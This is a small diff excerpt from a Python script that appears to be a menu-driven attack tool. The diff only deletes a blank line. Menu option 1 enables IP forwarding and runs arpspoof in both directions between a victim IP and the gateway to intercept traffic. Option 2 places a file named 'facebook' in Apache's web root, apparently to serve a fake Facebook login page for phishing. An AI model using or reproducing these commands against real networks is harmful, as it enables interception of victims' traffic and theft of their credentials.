@@ -14,7 +14,6 @@ if a=="1":
    os.system('clear')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system('arpspoof -i ' + interface+' -t ' + ip + " " + gw + '& arpspoof -i ' + interface + ' -t ' +gw + " " + ip)
-
 if a=="2":
    os.system('cat facebook > /var/www/html/index.html')
    os.system('service apache2 restart')
